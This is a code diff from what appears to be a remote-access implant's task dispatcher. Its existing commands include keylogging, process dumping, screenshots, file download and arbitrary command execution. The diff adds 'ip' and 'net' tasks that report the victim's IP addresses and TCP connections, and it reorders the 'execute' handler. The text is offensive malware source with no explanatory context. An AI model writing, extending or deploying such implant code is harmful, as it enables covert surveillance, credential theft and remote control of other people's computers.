@@ -93,7 +93,8 @@ std::wstring ExecuteTaskDownload(
     return wDest.c_str();
 }
 
-std::wstring ExecuteTaskExecute(const std::wstring& cmd) {
+std::wstring ExecuteTaskExecute(const std::wstring& cmd)
+{
     std::wstring result;
 
     result = ExecuteCmd(cmd);
@@ -102,6 +103,11 @@ std::wstring ExecuteTaskExecute(const std::wstring& cmd) {
         return L"Success: Command have been executed.";
     }
     return result;
+}
+
+std::wstring ExecuteTaskIp()
+{
+    return GetIpAddresses();
 }
 
 std::wstring ExecuteTaskKeyLog(const std::wstring& wLogTime)
@@ -323,6 +329,11 @@ std::wstring ExecuteTaskMv(
     }
 
     return L"Success: File has been moved to the destination.";
+}
+
+std::wstring ExecuteTaskNet()
+{
+    return GetNetTCPConnection();
 }
 
 std::wstring ExecuteTaskProcdump(const std::wstring& wPid)
@@ -589,6 +600,14 @@ std::wstring ExecuteTask(
             wDest
         );
     }
+    else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
+	{
+		return ExecuteTaskExecute(task.substr(8, task.size()));
+	}
+    else if (wcscmp(task.substr(0, 2).c_str(), L"ip") == 0)
+    {
+        return ExecuteTaskIp();
+    }
 	else if (wcscmp(task.substr(0, 7).c_str(), L"keylog ") == 0)
 	{
 		return ExecuteTaskKeyLog(task.substr(7, task.size()));
@@ -622,6 +641,10 @@ std::wstring ExecuteTask(
 
         return ExecuteTaskMv(wSrc, wDest);
     }
+    else if (wcscmp(task.c_str(), L"net") == 0)
+    {
+        return ExecuteTaskNet();
+    }
     else if (wcscmp(task.substr(0, 9).c_str(), L"procdump ") == 0)
     {
         return ExecuteTaskProcdump(task.substr(9, task.size()));
@@ -649,10 +672,6 @@ std::wstring ExecuteTask(
 	else if (wcscmp(task.c_str(), L"screenshot") == 0)
 	{
 		return ExecuteTaskScreenshot(hInstance, nCmdShow);
-	}
-	else if (wcscmp(task.substr(0, 8).c_str(), L"execute ") == 0)
-	{
-		return ExecuteTaskExecute(task.substr(8, task.size()));
 	}
 	else if (wcscmp(task.substr(0, 6).c_str(), L"sleep ") == 0)
 	{
